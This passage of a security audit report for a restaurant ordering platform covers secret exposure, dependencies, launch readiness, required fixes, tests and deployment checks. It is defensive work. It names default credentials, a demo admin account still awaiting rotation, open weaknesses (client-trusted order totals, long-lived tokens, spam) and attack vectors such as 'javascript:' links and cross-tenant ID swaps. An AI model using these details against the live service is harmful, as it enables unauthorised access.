- **Files inspected:** `.env.production.example`, `.env.docker.example`, `.gitignore`, `.dockerignore`, `Dockerfile`, `docker-compose*.yml`, `docker/`, `deploy.sh`, `go-live.sh`, `.github/workflows/deploy.yml`, `config/*.php`, seeders, `apps/*/public/firebase-config.js`.
- **Search patterns:** `git grep` for `secret|password|api_key|token|private key|JWT_SECRET|APP_KEY|DB_PASSWORD|AWS_|firebase`; `git ls-files | grep .env`; history scan for committed `.env`.
- **Confirmed exposures:** None in git-tracked files. No real `.env`, no service-account private key committed. Firebase `firebase-config.js` contains only **public** web config (apiKey/measurementId are public identifiers, not secrets). The server-side Firebase service account is correctly gitignored (`storage/firebase-credentials.json`).
- **Weak defaults (fixed):** `SUPER_ADMIN_PASSWORD` default `password` (H-02); DemoSeeder `password` (H-01).
- **Git-history:** No committed secrets found.
- **Required rotations (runtime):** If the live box was ever seeded with the defaults — rotate the Super Admin password and the `owner@mahsoub.test` demo admin (RA-1/RA-2).
- **Production variable risks:** `JWT_SECRET` was absent from the prod template (added). Fails closed (login 500) rather than open — availability, not security.

---

## 10. Dependency review

| Package | Version | Concern | Severity | Fixed in | Upgrade risk | Recommendation |
|---------|---------|---------|----------|----------|--------------|----------------|
| laravel/framework | 13.17.0 | Bleeding-edge major | Info | – | – | Confirm GA; track patch releases |
| firebase/php-jwt | 7.1.0 | – | None | – | – | Current; algo pinned on decode |
| intervention/image | 4.1.4 | Image processing | None | – | – | Current; re-encode strips payloads |
| phpoffice/phpspreadsheet | 5.9.0 | XXE historically | None | – | – | Current; `setReadDataOnly(true)`, formulas not evaluated |
| simplesoftwareio/simple-qrcode | 4.2.0 | – | None | – | – | Current |
| guzzlehttp/guzzle | 7.12.3 | – | None | – | – | Current |
| symfony/http-foundation | 7.4.13 | – | None | – | – | Current |
| kreait/laravel-firebase | 7.2.1 | – | None | – | – | Current |
| vue | 3.5.39 (menu ^3.4) | – | None | – | – | Current |
| vite | 8.x | – | None | – | – | Current; `.npmrc` `ignore-scripts=true` |

No known-vulnerable pins. `composer audit` / `pnpm audit` recommended in CI (see §13).

---

## 11. Production readiness checklist

| Item | Status |
|------|--------|
| Secret management | PASS (fixed; RA-1/RA-2 to verify at runtime) |
| Authentication (JWT) | PASS |
| Session security (revocation) | NEEDS VERIFICATION — TTL/refresh (M-06, P1) |
| Password reset | PASS (M-07 fixed; policy L-06 P2) |
| Role enforcement | PASS |
| Super Admin protection | PASS |
| Tenant isolation | PASS |
| Branch isolation | NOT APPLICABLE (single role per tenant by design) |
| Plan enforcement | PASS (L-01 race fixed) |
| Trial enforcement | PASS (server-computed) |
| Public menu filtering | PASS |
| Order integrity | FAIL — client-trusted totals (M-01, P1) |
| WhatsApp URL security | PASS |
| QR security | PASS |
| Bill-request security | PASS |
| Review security | PASS (spam M-08 P1) |
| File upload | PASS (bomb L-03 fixed) |
| Database security | PASS |
| CORS | PASS |
| CSRF | NOT APPLICABLE (stateless Bearer, no cookies) |
| XSS | PASS (M-03 fixed menu; landing P1) |
| Security headers | NEEDS VERIFICATION — full CSP (M-04 P1) |
| Rate limiting | PASS (per-account login lockout added, L-05) |
| Audit logging | PASS |
| Privacy | PASS (mailer default fixed, L-09; ensure real SMTP at runtime) |
| Dependency vulnerabilities | PASS |
| Error handling | PASS (APP_DEBUG=false default) |
| Production environment | PASS (fails closed on missing critical env) |
| HTTPS | NEEDS VERIFICATION (runtime, §15) |
| Backups | NEEDS VERIFICATION (deploy.sh backs up; restore untested) |
| Monitoring | NEEDS VERIFICATION |
| Incident readiness | NEEDS VERIFICATION |

---

## 12. Required fixes

### P0 — Must fix before launch (all code-fixes DONE; runtime actions pending)
| ID | Files | Change | Outcome | Status |
|----|-------|--------|---------|--------|
| H-01 | `database/seeders/DemoSeeder.php` | Random showcase-admin password | No guessable loginable admin | ✅ Fixed |
| H-02 | `config/platform.php`, `database/seeders/DatabaseSeeder.php`, `go-live.sh`, `.env.production.example` | Remove weak default; fail-closed seeder; go-live preflight | Cannot ship default super-admin | ✅ Fixed |
| H-03 | migration, `AppServiceProvider`, `PasswordResetController`, `RestaurantProvisioningService`, `User` | `password_changed_at` epoch invalidation | Reset kills stale tokens | ✅ Fixed |
| RA-1 | live VPS | Rotate/disable `owner@mahsoub.test` | Remove existing weak account | ⏳ Runtime |
| RA-2 | live VPS `.env` | Confirm `SUPER_ADMIN_PASSWORD`, `JWT_SECRET` set | No live default creds | ⏳ Runtime |

### P1 — Strongly recommended before/just-after launch
| ID | Change | Test required |
|----|--------|---------------|
| M-01 | Stop trusting client order totals in analytics (re-price server-side or exclude from reports) | Forged `total` doesn't move reports |
| M-04 | Author + test full `script-src`/`connect-src` CSP for all 3 apps | Apps load; CSP report clean |
| M-06 | Reduce JWT TTL + add refresh tokens or `jti` logout blocklist | Logout invalidates token |
| M-08 | Require session token / CAPTCHA for slug-only order/review; tighten throttles | Spam blocked |
| M-03 (landing) | Apply `safeUrl` to landing hero-link computeds | `javascript:` link dropped |

### P2 — Post-launch hardening
**Done this pass:** L-05 (per-account login lockout), L-06 (`min:12`+complexity), L-07 (bounded report ranges), L-08 (scope DeviceToken upsert), L-09 (mailer default + warning).
**Remaining:** I-01 (FK-validate `subscription_plan`), I-02 (pin CI SSH host key), I-03 (non-root container), I-04 (explicit prod CORS), plus the opt-in `uncompromised()` HIBP check on reset.

---

## 13. Security tests executed

| Command | Result |
|---------|--------|
| `php artisan test --testsuite=Feature` | **PASS** — 225 tests, 784 assertions |
| `php artisan test tests/Feature/SecurityHardeningTest.php` | **PASS** — 10 tests (new) |
| `./vendor/bin/pint --test` | **PASS** — style clean |
| `pnpm --filter @xorder/menu build` | **PASS** — vite build clean |
| `php -l` on all changed PHP | **PASS** — no syntax errors |

New regression tests: `SecurityHardeningTest` — token invalidation before/after password change, reset stamps epoch, reset-failure non-enumeration, weak-password rejection, per-account login lockout, device-token hijack refusal, `role`/`restaurant_id` not mass-assignable, CsvSafe formula neutralisation, fail-closed super-admin seeder. `ReportTest` — oversized and inverted date-range rejection.

Recommended CI additions (not yet wired): `composer audit`, `pnpm audit --prod`.

---

## 14. Files modified

| File | Reason | Finding | Result |
|------|--------|---------|--------|
| `apps/api/config/platform.php` | Remove weak super-admin password default | H-02 | ✅ |
| `apps/api/database/seeders/DatabaseSeeder.php` | Fail closed on empty super-admin password; forceFill guarded fields | H-02, L-02 | ✅ |
| `apps/api/database/seeders/DemoSeeder.php` | Random showcase-admin password; forceFill | H-01, L-02 | ✅ |
| `go-live.sh` | Require `JWT_SECRET` + `SUPER_ADMIN_PASSWORD` in preflight | H-02 | ✅ |
| `.env.production.example` | Add documented `JWT_SECRET=` | H-02 | ✅ |
| `apps/api/database/migrations/2026_07_25_000200_add_password_changed_at_to_users_table.php` | New column | H-03 | ✅ |
| `apps/api/app/Models/User.php` | Cast `password_changed_at`; drop `role`/`restaurant_id` from `$fillable` | H-03, L-02 | ✅ |
| `apps/api/app/Providers/AppServiceProvider.php` | Reject tokens minted before password change | H-03 | ✅ |
| `apps/api/app/Http/Controllers/Auth/PasswordResetController.php` | Stamp epoch; generic failure message | H-03, M-07 | ✅ |
| `apps/api/app/Services/RestaurantProvisioningService.php` | Stamp epoch; forceCreate/forceFill guarded fields | H-03, L-02 | ✅ |
| `apps/api/lang/{en,ar}/xorder.php` | `password_reset_failed` message | M-07 | ✅ |
| `apps/api/app/Support/CsvSafe.php` | New formula-injection neutraliser | M-02 | ✅ |
| `apps/api/app/Http/Controllers/Dashboard/ReportController.php` | Apply CsvSafe to CSV+XLSX | M-02 | ✅ |
| `apps/api/app/Http/Controllers/Admin/LeadController.php` | Apply CsvSafe to lead export | M-02 | ✅ |
| `apps/api/app/Http/Controllers/Dashboard/BranchController.php` | Locked transaction for limit check | L-01 | ✅ |
| `apps/api/app/Http/Controllers/Dashboard/MenuItemController.php` | Locked transaction for limit check | L-01 | ✅ |
| `apps/api/app/Services/ImageUploadService.php` | Dimension guard before decode | L-03 | ✅ |
| `apps/api/app/Http/Controllers/Public/PublicOrderController.php` | `try/finally` around tenant override | L-04 | ✅ |
| `apps/api/app/Providers/AppServiceProvider.php` | Named `login` limiter (per-account) | L-05 | ✅ |
| `apps/api/routes/api.php` | Login route uses `throttle:login` | L-05 | ✅ |
| `apps/api/app/Http/Controllers/Auth/PasswordResetController.php` | `min(12)` + complexity | L-06 | ✅ |
| `apps/api/app/Http/Controllers/Dashboard/ReportController.php` | Bounded/ordered date range + CsvSafe | L-07, M-02 | ✅ |
| `apps/api/config/platform.php` | `report_max_range_days` + remove weak SA default | L-07, H-02 | ✅ |
| `apps/api/app/Http/Controllers/Dashboard/PushTokenController.php` | Refuse cross-user token claim | L-08 | ✅ |
| `.env.production.example` | Mailer default `smtp` + `JWT_SECRET` | L-09, H-02 | ✅ |
| `go-live.sh` | Warn on `MAIL_MAILER=log`; require secrets | L-09, H-02 | ✅ |
| `apps/menu/src/lib/safeUrl.js` | New URL-scheme allow-list | M-03 | ✅ |
| `apps/menu/src/components/Footer.vue` | Filter unsafe social links | M-03 | ✅ |
| `apps/menu/src/components/BranchesPage.vue` | Guard `map_url` | M-03 | ✅ |
| `docker/nginx/xorder.io.conf` | Conservative CSP + Permissions-Policy | M-04 | ✅ |
| `apps/api/tests/Feature/SecurityHardeningTest.php` | Regression tests | H-02/H-03/L-02/M-02/M-07 | ✅ |

---

## 15. Manual deployment verification (requires the live environment)

- **RA-1/RA-2:** Rotate `owner@mahsoub.test`; verify `SUPER_ADMIN_PASSWORD`/`JWT_SECRET` set on the VPS `.env`.
- **DNS / TLS / HTTPS redirect:** Confirm `*.xorder.io` wildcard TLS, HTTP→HTTPS 301, HSTS preload eligibility.
- **Production headers:** `curl -I https://xorder.io` — confirm HSTS, X-Content-Type-Options, Referrer-Policy, the new CSP/Permissions-Policy are actually served on all three apps.
- **Deployed CORS:** Confirm `CORS_ALLOWED_ORIGINS` is the real prod origin, not localhost.
- **Source maps:** Confirm no `.map` files served for prod bundles.
- **Storage permissions:** Confirm `/uploads` served public, no directory listing, no traversal.
- **DB network exposure:** Confirm Postgres port not published (compose shows internal-only — verify at runtime).
- **Cloud IAM / Firebase:** Confirm the service-account file is present, least-privilege, not world-readable.
- **Backup restoration:** `deploy.sh` backs up pre-deploy — perform a real restore drill.
- **Monitoring/alerts, runtime rate limiting, WAF/CDN:** confirm in front of the origin.
- **Cross-tenant + Super Admin runtime testing:** with two real tenants, attempt ID-swap on `/dashboard/*` (expect 404) and `/admin/*` from a RESTAURANT_ADMIN token (expect 403).
- **Full CSP (M-04):** deploy the tuned `script-src` policy in report-only first, watch reports, then enforce.

---

## Appendix — Final response summary

**Launch decision:** `LAUNCH ONLY AFTER REQUIRED FIXES` — P0 code fixes done + RA-1/RA-2 runtime verification.

**Severity totals:** Critical 0 · High 3 (all fixed) · Medium 8 (5 fixed/mitigated, 3 open P1) · Low 9 (all fixed) · Informational 4.

**Launch blockers:** H-01, H-02, H-03 (code — fixed); RA-1, RA-2 (runtime — pending operator).

**Fixed vulnerabilities:** H-01, H-02, H-03, M-02, M-07, L-01, L-02, L-03, L-04, L-05, L-06, L-07, L-08, L-09; M-03 (menu), M-04 (partial).

**Remaining risks:** M-01 (order-total trust), M-05 (localStorage JWT, accepted), M-06 (TTL/revocation), M-08 (spam), M-03 (landing), plus P2 lows.

**No Critical cross-tenant, auth-bypass, or RCE issue was found. Do not treat a green build or passing dependency scan as launch readiness — the runtime actions in §15 are mandatory.**
